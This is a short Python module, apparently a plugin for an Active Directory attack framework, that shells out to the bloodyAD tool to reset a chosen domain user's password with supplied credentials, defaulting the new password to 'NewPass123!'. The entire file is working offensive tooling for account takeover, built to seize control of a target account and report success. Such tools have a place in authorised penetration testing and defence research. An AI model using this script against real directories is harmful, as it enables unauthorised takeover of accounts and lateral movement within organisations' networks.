import subprocess

# Colors
G, R, B, E = "\033[92m", "\033[91m", "\033[94m", "\033[0m"

def run(data, cred, args):
    target_user = args.extra[0] if args.extra else None
    new_password = args.extra[1] if len(args.extra) > 1 else "NewPass123!"
    
    # Check if user wants to see the "guts"
    verbose = getattr(args, "debug", False) or getattr(args, "v", False)

    if not target_user:
        print(f"{R}[-] Missing target user{E}")
        return {"success": False}

    cmd = [
        "bloodyAD", "--host", data['ip'], "-d", data['domain'],
        "-u", cred['user'], "-p", cred['secret'],
        "set", "password", target_user, new_password
    ]

    print(f"[*] Executing: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=True, text=True)
    success = "success" in result.stdout.lower() or "changed" in result.stdout.lower()
    
    if success:
        print(f"{G}[+] {target_user} password changed.{E}")
    else:
        print(f"{R}[-] Failed to change password for {target_user}{E}")
        print(result.stdout + result.stderr)
        
    return {"success": success, "user": target_user, "pass": new_password}